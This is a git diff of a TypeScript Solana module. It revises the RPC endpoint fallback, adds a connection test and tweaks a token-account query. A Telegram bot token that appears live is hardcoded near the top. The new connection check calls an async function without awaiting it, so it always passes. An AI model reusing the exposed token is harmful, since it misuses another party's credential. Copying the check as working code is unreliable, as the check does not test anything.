@@ -1,4 +1,3 @@
-
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
@@ -31,25 +30,44 @@ async function retry<T>(
 // Create a connection with proper config
 const createConnection = () => {
   const rpcEndpoints = [
-    "https://solana-mainnet.g.alchemy.com/v2/demo",
     "https://api.mainnet-beta.solana.com",
-    "https://solana-api.projectserum.com"
+    "https://solana-api.projectserum.com",
+    "https://rpc.ankr.com/solana"
   ];
+  
+  let lastError;
   
   // Try endpoints until one works
   for (const endpoint of rpcEndpoints) {
     try {
-      return new Connection(endpoint, {
+      const connection = new Connection(endpoint, {
         commitment: 'confirmed',
         confirmTransactionInitialTimeout: 60000,
+        wsEndpoint: endpoint.replace('https', 'wss'),
       });
+      
+      // Test the connection
+      const testConnection = async () => {
+        try {
+          await connection.getVersion();
+          return true;
+        } catch {
+          return false;
+        }
+      };
+      
+      if (testConnection()) {
+        console.log(`Connected successfully to ${endpoint}`);
+        return connection;
+      }
     } catch (error) {
       console.error(`Failed to connect to ${endpoint}:`, error);
+      lastError = error;
       continue;
     }
   }
   
-  // Fallback to default endpoint if all others fail
+  console.error('All RPC endpoints failed, using fallback');
   return new Connection("https://api.mainnet-beta.solana.com", {
     commitment: 'confirmed',
     confirmTransactionInitialTimeout: 60000,
@@ -67,7 +85,8 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
         pubKey,
         {
           programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-        }
+        },
+        'confirmed'
       );
     });
 
